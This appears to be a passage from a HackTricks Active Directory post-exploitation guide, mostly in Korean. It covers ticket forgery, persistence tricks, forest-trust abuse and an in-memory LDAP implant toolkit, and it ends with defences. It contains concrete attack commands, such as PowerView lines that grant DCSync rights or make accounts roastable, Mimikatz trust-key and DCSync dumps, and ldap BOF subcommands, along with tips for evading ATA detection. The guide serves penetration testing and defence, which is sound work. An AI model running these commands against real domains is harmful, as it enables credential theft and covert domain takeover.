
**다른 users**가 **compromised**된 머신에 **access**하면, **memory에서 credentials를 gather**하고 심지어 그들의 프로세스에 **beacons를 inject**하여 그들을 impersonate할 수 있습니다.\
보통 users는 RDP를 통해 시스템에 접근하므로, 여기서는 third party RDP sessions에 대해 몇 가지 attack을 수행하는 방법을 소개합니다:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS**는 domain-joined computers에서 **local Administrator password**를 관리하는 시스템을 제공하며, 이 password가 **randomized**되고 고유하며 자주 **changed**되도록 보장합니다. 이 password들은 Active Directory에 저장되며, access는 ACL을 통해 권한이 있는 사용자만 가능하도록 제어됩니다. 이 password들에 access할 충분한 권한이 있으면, 다른 computers로 pivot하는 것이 가능합니다.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

compromised machine에서 **certificates를 gathering**하는 것은 환경 내부에서 privileges를 escalate하는 한 방법이 될 수 있습니다:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

**vulnerable templates**가 구성되어 있다면, 이를 abused하여 privileges를 escalate할 수 있습니다:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

**Domain Admin** 또는 더 나아가 **Enterprise Admin** privileges를 얻으면, **domain database**인 _ntds.dit_를 **dump**할 수 있습니다.

[**DCSync attack에 대한 더 많은 정보는 여기에서 확인할 수 있습니다**](dcsync.md).

[**NTDS.dit를 steal하는 방법에 대한 더 많은 정보는 여기에서 확인할 수 있습니다**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

앞서 논의한 몇 가지 techniques는 persistence에 사용할 수 있습니다.\
예를 들어 다음과 같이 할 수 있습니다:

- 사용자를 [**Kerberoast**](kerberoast.md)에 취약하게 만들기

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- 사용자를 [**ASREPRoast**](asreproast.md)에 취약하게 만들기

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- 사용자에게 [**DCSync**](#dcsync) 권한 부여

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack**은 **NTLM hash**(예를 들어 **PC account의 hash**)를 사용해 특정 service에 대한 **합법적인 Ticket Granting Service (TGS) ticket**을 생성합니다. 이 방법은 **service privileges에 접근**하는 데 사용됩니다.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack**은 공격자가 Active Directory(AD) 환경에서 **krbtgt account의 NTLM hash**에 접근하는 것을 의미합니다. 이 account는 모든 **Ticket Granting Tickets (TGTs)** 를 서명하는 데 사용되기 때문에 특별하며, AD network 내 인증에 필수적입니다.

공격자가 이 hash를 얻으면, 원하는 어떤 account에 대해서도 **TGTs**를 만들 수 있습니다(Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

이것들은 **일반적인 golden tickets 탐지 메커니즘을 우회하는 방식으로 forged된** golden ticket과 비슷합니다. 


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**어떤 account의 certificates를 가지고 있거나 요청할 수 있다면**, 그 사용자의 account에서 지속적으로 남아 있기 매우 좋은 방법입니다(비밀번호가 바뀌어도):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**certificates를 사용하면 domain 내부에서 높은 privileges로 persistence를 유지하는 것도 가능합니다:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory의 **AdminSDHolder** object는 모든 privileged groups(예: Domain Admins 및 Enterprise Admins)에 표준 **Access Control List (ACL)** 를 적용하여 무단 변경을 막음으로써 이들의 보안을 보장합니다. 하지만 이 기능은 악용될 수 있습니다. 공격자가 AdminSDHolder의 ACL을 수정해 일반 사용자에게 전체 access를 주면, 그 사용자는 모든 privileged groups에 대해 광범위한 control을 얻습니다. 보호하기 위한 이 보안 조치는, 따라서 면밀히 모니터링하지 않으면 오히려 역효과를 낼 수 있습니다.

[**AdminDSHolder Group에 대한 더 많은 정보는 여기.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

모든 **Domain Controller (DC)** 내부에는 **local administrator** account가 존재합니다. 이런 머신에서 admin rights를 얻으면, **mimikatz**를 사용해 local Administrator hash를 추출할 수 있습니다. 그 다음에는 이 password의 **use를 enable**하기 위해 registry modification이 필요하며, 이를 통해 local Administrator account에 remote access할 수 있게 됩니다.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

특정 domain objects에 대해 어떤 **user**에게 **special permissions**를 주면, 그 사용자가 **future에 privileges를 escalate**할 수 있게 됩니다.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**security descriptors**는 **object가 다른 object에 대해 가지는 permissions**를 **store**하는 데 사용됩니다. object의 **security descriptor에 아주 작은 change만** 할 수 있어도, privileged group의 member가 아니더라도 그 object에 대해 매우 흥미로운 privileges를 얻을 수 있습니다.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

`dynamicObject` auxiliary class를 남용하여 `entryTTL`/`msDS-Entry-Time-To-Die`를 가진 단명 principals/GPOs/DNS records를 생성합니다. 이들은 tombstone 없이 self-delete하며, LDAP evidence를 지우는 동시에 orphan SID, 깨진 `gPLink` references, 또는 캐시된 DNS responses(예: AdminSDHolder ACE pollution 또는 악성 `gPCFileSysPath`/AD-integrated DNS redirects)를 남깁니다.

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

메모리에서 **LSASS**를 변경하여 모든 domain accounts에 접근 가능한 **universal password**를 설정합니다.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[SSP (Security Support Provider)가 무엇인지 여기에서 알아보세요.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
당신만의 **SSP**를 만들어, 머신에 접근하는 데 사용된 credentials를 **clear text**로 **capture**할 수 있습니다.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

AD에 **새 Domain Controller**를 등록하고, 이를 사용해 지정된 objects에 **attributes를 push**(SIDHistory, SPNs...) 하면서도 변경에 대한 어떤 **logs**도 남기지 않습니다. **DA** privileges가 필요하고 **root domain** 내부에 있어야 합니다.\
잘못된 데이터를 사용하면 꽤 보기 흉한 logs가 나타납니다.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

앞서 **LAPS passwords를 읽을 충분한 권한**이 있으면 privileges를 escalate하는 방법을 논의했습니다. 그러나 이 password들은 **persistence를 유지**하는 데도 사용할 수 있습니다.\
다음을 확인하세요:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft는 **Forest**를 security boundary로 봅니다. 이는 **하나의 domain을 compromise하는 것만으로도 전체 Forest가 compromise될 수 있음을 의미**합니다.

### Basic Information

[**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>)는 한 **domain**의 사용자가 다른 **domain**의 resources에 access할 수 있게 하는 security mechanism입니다. 이는 본질적으로 두 domain의 authentication system 사이에 link를 만들어 authentication verification이 원활하게 흐르도록 합니다. domains가 trust를 설정하면, 이들은 trust의 무결성에 중요한 특정 **keys**를 각자의 **Domain Controllers (DCs)** 내에서 교환하고 보관합니다.

일반적인 시나리오에서, 사용자가 **trusted domain**의 service에 access하려면 먼저 자신의 domain DC에서 **inter-realm TGT**라는 특수 ticket을 요청해야 합니다. 이 TGT는 두 domain이 합의한 공유 **key**로 암호화됩니다. 사용자는 이 TGT를 **trusted domain의 DC**에 제시하여 service ticket(**TGS**)을 받습니다. trusted domain DC가 inter-realm TGT를 성공적으로 검증하면 TGS를 발급하고, 사용자는 해당 service에 access할 수 있게 됩니다.

**Steps**:

1. **Domain 1**의 **client computer**가 자신의 **NTLM hash**를 사용해 **Ticket Granting Ticket (TGT)** 를 **Domain Controller (DC1)** 에 요청하며 프로세스를 시작합니다.
2. DC1은 client가 성공적으로 authenticated되면 새 TGT를 발급합니다.
3. 그런 다음 client는 **Domain 2**의 resources에 access하는 데 필요한 **inter-realm TGT**를 DC1에 요청합니다.
4. inter-realm TGT는 two-way domain trust의 일부로 DC1과 DC2가 공유하는 **trust key**로 암호화됩니다.
5. client는 inter-realm TGT를 **Domain 2의 Domain Controller (DC2)** 로 가져갑니다.
6. DC2는 공유 trust key를 사용해 inter-realm TGT를 검증하고, 유효하면 client가 access하려는 Domain 2의 server에 대한 **Ticket Granting Service (TGS)** 를 발급합니다.
7. 마지막으로 client는 이 TGS를 server에 제시하며, 이 TGS는 server의 account hash로 암호화되어 Domain 2의 service에 access하게 됩니다.

### Different trusts

**trust는 1 way 또는 2 ways**일 수 있다는 점이 중요합니다. 2 ways 옵션에서는 두 domain이 서로를 trust하지만, **1 way** trust relation에서는 한 domain이 **trusted** domain이고 다른 하나가 **trusting** domain입니다. 마지막 경우, **trusted domain에서 trusting domain 내부의 resources에만 access할 수 있습니다**.

만약 Domain A가 Domain B를 trust한다면, A는 trusting domain이고 B는 trusted one입니다. 또한 **Domain A**에서는 이것이 **Outbound trust**이고, **Domain B**에서는 **Inbound trust**입니다.

**Different trusting relationships**

- **Parent-Child Trusts**: 같은 forest 내에서 흔한 설정으로, child domain은 parent domain과 자동으로 two-way transitive trust를 가집니다. 본질적으로 이는 parent와 child 사이에 authentication requests가 원활하게 흐를 수 있음을 의미합니다.
- **Cross-link Trusts**: "shortcut trusts"라고도 하며, child domains 사이에 referral process를 빠르게 하기 위해 설정됩니다. 복잡한 forest에서는 authentication referrals가 보통 forest root까지 갔다가 다시 target domain으로 내려와야 합니다. cross-links를 만들면 여정이 짧아지며, 지리적으로 분산된 환경에서 특히 유리합니다.
- **External Trusts**: 서로 관련 없는 다른 domains 사이에 설정되며, 본질적으로 non-transitive입니다. [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)에 따르면, external trusts는 forest trust로 연결되지 않은 현재 forest 밖의 domain resources에 access하는 데 유용합니다. external trusts에서는 SID filtering으로 security가 강화됩니다.
- **Tree-root Trusts**: forest root domain과 새로 추가된 tree root 사이에 자동으로 설정됩니다. 흔하진 않지만, tree-root trusts는 forest에 새 domain tree를 추가할 때 중요하며, 고유한 domain name을 유지하고 two-way transitivity를 보장합니다. 자세한 내용은 [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)에서 확인할 수 있습니다.
- **Forest Trusts**: 두 forest root domains 사이의 two-way transitive trust이며, security measures를 강화하기 위해 SID filtering도 적용합니다.
- **MIT Trusts**: non-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domains와 설정되는 trusts입니다. MIT trusts는 다소 더 특수하며, Windows ecosystem 밖의 Kerberos-based systems와 통합이 필요한 환경을 위한 것입니다.

#### Other differences in **trusting relationships**

- trust relationship는 **transitive**(A trust B, B trust C이면 A trust C)일 수도 있고 **non-transitive**일 수도 있습니다.
- trust relationship는 **bidirectional trust**(서로 trust) 또는 **one-way trust**(한쪽만 다른 쪽을 trust)로 설정할 수 있습니다.

### Attack Path

1. trusting relationships를 **Enumerate**합니다.
2. 어떤 **security principal**(user/group/computer)이 **other domain**의 resources에 **access**할 수 있는지 확인합니다. ACE entries 때문이거나 other domain의 groups에 속해 있기 때문일 수 있습니다. **domains across relationships**를 찾아보세요(아마 이 목적으로 trust가 생성된 것입니다).
1. 이 경우 kerberoast도 또 다른 옵션일 수 있습니다.
3. domains를 통해 **pivot**할 수 있는 **accounts**를 **Compromise**합니다.

Attackers with could access to resources in another domain through three primary mechanisms:

- **Local Group Membership**: Principals might be added to local groups on machines, such as the “Administrators” group on a server, granting them significant control over that machine.
- **Foreign Domain Group Membership**: Principals can also be members of groups within the foreign domain. However, the effectiveness of this method depends on the nature of the trust and the scope of the group.
- **Access Control Lists (ACLs)**: Principals might be specified in an **ACL**, particularly as entities in **ACEs** within a **DACL**, providing them access to specific resources. For those looking to dive deeper into the mechanics of ACLs, DACLs, and ACEs, the whitepaper titled “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” is an invaluable resource.

### Find external users/groups with permissions

**`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`**를 확인하면 도메인에서 foreign security principals를 찾을 수 있습니다. 이는 **external domain/forest**의 user/group입니다.

이것은 **Bloodhound**에서 확인하거나 powerview를 사용해 확인할 수 있습니다:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest 권한 상승
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
도메인 trust를 열거하는 다른 방법:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> There are **2 trusted keys**, one for _Child --> Parent_ and another one for _Parent_ --> _Child_.\
> You can the one used by the current domain them with:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

SID-History injection을 사용해 trust를 악용하여 Enterprise admin으로 child/parent domain에서 권한 상승:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Configuration Naming Context (NC)가 어떻게 악용될 수 있는지 이해하는 것은 매우 중요합니다. Configuration NC는 Active Directory (AD) 환경에서 forest 전반의 configuration data를 위한 중앙 저장소 역할을 합니다. 이 data는 forest 내의 모든 Domain Controller (DC)로 복제되며, writable DC는 Configuration NC의 writable copy를 유지합니다. 이를 악용하려면 **DC에서 SYSTEM privileges**가 있어야 하며, 가능하면 child DC가 좋습니다.

**Link GPO to root DC site**

Configuration NC의 Sites container에는 AD forest 내 모든 domain-joined computers의 sites 정보가 들어 있습니다. 어떤 DC에서든 SYSTEM privileges로 동작하면, 공격자는 GPO를 root DC sites에 link할 수 있습니다. 이 작업은 해당 site에 적용되는 policies를 조작하여 root domain을 잠재적으로 compromise할 수 있습니다.

자세한 정보는 [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research) research를 참고할 수 있습니다.

**Compromise any gMSA in the forest**

공격 벡터 중 하나는 domain 내의 privileged gMSA를 노리는 것입니다. gMSA의 passwords를 계산하는 데 필수적인 KDS Root key는 Configuration NC에 저장됩니다. 어떤 DC에서든 SYSTEM privileges가 있으면 KDS Root key에 접근하여 forest 전반의 어떤 gMSA든 passwords를 계산할 수 있습니다.

자세한 분석과 단계별 가이드는 다음에서 확인할 수 있습니다:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

보완적인 delegated MSA attack (BadSuccessor – migration attributes 악용):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

추가 외부 research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

이 방법은 새로운 privileged AD objects가 생성되기를 기다려야 하므로 인내가 필요합니다. SYSTEM privileges를 사용하면 공격자는 AD Schema를 수정하여 어떤 사용자에게든 모든 classes에 대한 complete control을 부여할 수 있습니다. 이는 새로 생성되는 AD objects에 대한 무단 접근과 통제를 초래할 수 있습니다.

추가 읽을거리는 [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent)에서 확인할 수 있습니다.

**From DA to EA with ADCS ESC5**

ADCS ESC5 vulnerability는 Public Key Infrastructure (PKI) objects에 대한 control을 노려, forest 내의 어떤 사용자로도 authentication할 수 있게 해주는 certificate template를 생성합니다. PKI objects는 Configuration NC에 있으므로, writable child DC를 compromise하면 ESC5 attacks를 실행할 수 있습니다.

이에 대한 더 자세한 내용은 [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c)에서 읽을 수 있습니다. ADCS가 없는 시나리오에서는, 공격자가 필요한 구성 요소를 직접 설정할 수 있으며, 이는 [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)에서 설명합니다.

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
이 시나리오에서 **your domain**은 외부 도메인에 의해 **trusted** 되어 있으며, 그 도메인에 대해 **undetermined permissions** 를 가지고 있습니다. 당신은 **your domain의 어떤 principals가 external domain에 대해 어떤 access를 가지고 있는지** 찾아낸 다음, 이를 exploit하려고 시도해야 합니다:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### External Forest Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
In this scenario **your domain** is **trusting** some **privileges** to principal from a **different domains**.

However, when a **domain is trusted** by the trusting domain, the trusted domain **creates a user** with a **predictable name** that uses as **password the trusted password**. Which means that it's possible to **access a user from the trusting domain to get inside the trusted one** to enumerate it and try to escalate more privileges:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Another way to compromise the trusted domain is to find a [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) created in the **opposite direction** of the domain trust (which isn't very common).

Another way to compromise the trusted domain is to wait in a machine where a **user from the trusted domain can access** to login via **RDP**. Then, the attacker could inject code in the RDP session process and **access the origin domain of the victim** from there.\
Moreover, if the **victim mounted his hard drive**, from the **RDP session** process the attacker could store **backdoors** in the **startup folder of the hard drive**. This technique is called **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- SID history 속성을 활용하는 공격 위험은 forest trust 전반에서 SID Filtering으로 완화되며, 이는 모든 inter-forest trust에서 기본적으로 활성화되어 있다. 이는 Microsoft의 입장에 따라 domain이 아니라 forest를 security boundary로 간주하며, intra-forest trust는 안전하다는 가정에 기반한다.
- 그러나 문제가 하나 있는데, SID filtering은 application과 user access를 방해할 수 있어 때때로 비활성화되기도 한다.

### **Selective Authentication:**

- inter-forest trust에서는 Selective Authentication을 사용하면 두 forest의 사용자들이 자동으로 authenticated되지 않는다. 대신 trusting domain 또는 forest 내의 domain과 server에 접근하려면 명시적인 권한이 필요하다.
- 이러한 조치들은 writable Configuration Naming Context (NC)나 trust account에 대한 공격으로부터는 보호하지 못한다는 점을 알아야 한다.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) re-implements bloodyAD-style LDAP primitives as x64 Beacon Object Files that run entirely inside an on-host implant (e.g., Adaptix C2). Operators compile the pack with `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, load `ldap.axs`, and then call `ldap <subcommand>` from the beacon. All traffic rides the current logon security context over LDAP (389) with signing/sealing or LDAPS (636) with auto certificate trust, so no socks proxies or disk artifacts are required.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` resolve short names/OU paths into full DNs and dump the corresponding objects.
- `get-object`, `get-attribute`, and `get-domaininfo` pull arbitrary attributes (including security descriptors) plus the forest/domain metadata from `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` expose roasting candidates, delegation settings, and existing [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors directly from LDAP.
- `get-acl` and `get-writable --detailed` parse the DACL to list trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), and inheritance, giving immediate targets for ACL privilege escalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`)는 operator가 OU 권한이 있는 곳 어디서든 새 principal 또는 machine account를 준비할 수 있게 해준다. `add-groupmember`, `set-password`, `add-attribute`, `set-attribute`는 write-property 권한이 발견되면 대상 계정을 직접 hijack한다.
- `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, `add-dcsync` 같은 ACL 중심 명령은 어떤 AD object든 WriteDACL/WriteOwner를 password reset, group membership control, 또는 DCSync replication privilege로 바꾸며, PowerShell/ADSI artifact를 남기지 않는다. `remove-*` 대응 명령은 주입된 ACE를 정리한다.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn`은 compromised user를 즉시 Kerberoastable하게 만든다. `add-asreproastable` (UAC toggle)은 password를 건드리지 않고 AS-REP roasting 대상으로 표시한다.
- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`)는 beacon에서 `msDS-AllowedToDelegateTo`, UAC flags, 또는 `msDS-AllowedToActOnBehalfOfOtherIdentity`를 다시 써서 constrained/unconstrained/RBCD attack path를 가능하게 하고, remote PowerShell이나 RSAT가 필요 없게 만든다.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory`는 controlled principal의 SID history에 privileged SID를 주입한다([SID-History Injection](sid-history-injection.md) 참조). 이를 통해 LDAP/LDAPS만으로 stealthy access inheritance를 제공한다.
- `move-object`는 computers 또는 users의 DN/OU를 변경하여, 공격자가 이미 delegated rights가 존재하는 OU로 asset을 옮긴 뒤 `set-password`, `add-groupmember`, 또는 `add-spn`을 악용할 수 있게 한다.
- 범위가 좁은 removal 명령들(`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, etc.)은 operator가 credentials나 persistence를 확보한 뒤 빠르게 rollback할 수 있게 해주며, telemetry를 최소화한다.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins Restrictions**: Domain Admins는 Domain Controllers에서만 login 하도록 허용하고, 다른 host에서의 사용은 피하는 것이 권장된다.
- **Service Account Privileges**: 보안을 유지하기 위해 service는 Domain Admin (DA) privileges로 실행해서는 안 된다.
- **Temporal Privilege Limitation**: DA privileges가 필요한 task는 그 duration을 제한해야 한다. 이는 다음으로 구현할 수 있다: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Event IDs 2889/3074/3075를 audit한 뒤, DCs/clients에서 LDAP signing과 LDAPS channel binding을 강제하여 LDAP MITM/relay 시도를 차단한다.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Protocol-level fingerprinting of Impacket activity

일반적인 AD tradecraft를 탐지하고 싶다면, 이름이 바뀐 binaries, service names, temp batch files, output paths 같은 **operator-controlled artifacts에만 의존하지 말라**. 정상 Windows client가 [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC, WMI traffic을 어떻게 만드는지 baseline을 잡고, operator가 `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py`, `ntlmrelayx.py`를 수정한 뒤에도 남는 **implementation quirks**를 찾아라.

- **High-confidence standalone candidates** (자신의 baseline과 검증한 뒤):
- `auth_context_id = 79231 + ctx_id`를 사용하는 authenticated DCE/RPC
- `0xff`로 채워진 DCE/RPC authentication padding
- raw Kerberos `AP-REQ`를 SPNEGO `mechToken`에 직접 넣는 LDAP Kerberos bind
- ASCII처럼 보이는 `ClientGuid` 값을 가진 SMB2/3 negotiate request
- 비표준 namespace `//./root/cimv2`를 사용하는 WMI `IWbemLevel1Login::NTLMLogin`
- Hardcoded Kerberos nonce 값
- **Better as correlation/scoring features**:
- Sparse 또는 duplicated Kerberos etype lists, unusual/missing `PA-DATA`, 또는 native Windows와 다른 TGS-REQ etype ordering
- version info가 없는 NTLM Type 1 메시지, 또는 null host names가 있는 Type 3 메시지
- SPNEGO 대신 DCE/RPC에 실린 raw NTLMSSP, missing DCE/RPC verification trailers, 또는 SPNEGO/Kerberos OID mismatches
- 같은 host/user/session/time window에서 이런 특성이 여러 개 보이면, 약한 단일 field보다 훨씬 강하다
- **Use as enrichment, not as standalone alerts**:
- Default filenames, output paths, random service names, temporary batch names, default computer account names, tool-specific HTTP/WebDAV/RDP/MSSQL strings
- 이것들은 operator가 쉽게 바꿀 수 있으므로, cross-protocol cluster가 왜 suspicious한지 설명할 때 보조적으로 쓰는 것이 좋다
- **Operational notes**:
- 일부 signal은 decrypted traffic, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW, 또는 service-side visibility가 필요하다
- alert로 승격하기 전에 Samba/Linux clients, appliances, legacy software를 기준으로 검증하라
- baseline에 대한 confidence를 쌓아가면서 detection을 enrichment -> hunting -> alerting 순으로 승격하라

### **Implementing Deception Techniques**

- deception을 구현하려면 decoy users나 computers처럼 trap을 설치해야 하며, password가 만료되지 않거나 Trusted for Delegation으로 표시된 feature를 포함할 수 있다. 상세한 접근 방식에는 특정 rights를 가진 users를 만들거나 high privilege groups에 추가하는 것이 포함된다.
- 실용적인 예시는 다음과 같은 tools를 사용하는 것이다: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- deception techniques 배포에 대한 더 자세한 내용은 [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception)에서 확인할 수 있다.

### **Identifying Deception**

- **For User Objects**: atypical ObjectSID, infrequent logons, creation dates, low bad password counts 같은 suspicious indicator가 포함된다.
- **General Indicators**: potential decoy objects의 attribute를 genuine object와 비교하면 inconsistency를 드러낼 수 있다. [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) 같은 tool이 이런 deception 식별을 도와줄 수 있다.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: ATA detection을 피하기 위해 Domain Controllers에서 session enumeration을 하지 않는다.
- **Ticket Impersonation**: ticket creation에 **aes** keys를 사용하면 NTLM으로 downgrade하지 않으므로 탐지를 회피하는 데 도움이 된다.
- **DCSync Attacks**: Domain Controller가 아닌 곳에서 실행하면 ATA detection을 피할 수 있다. Domain Controller에서 직접 실행하면 alert가 발생한다.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)
- [ThatTotallyRealMyth/Impacket-IoCs – Dissecting Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [rub-softsec/onelogon - Onelogon: Taking over Active Directory Accounts via Netlogon](https://github.com/rub-softsec/onelogon)
- [Microsoft - How to manage the changes in Netlogon secure channel connections associated with CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11ee)

{{#include ../../banners/hacktricks-training.md}}
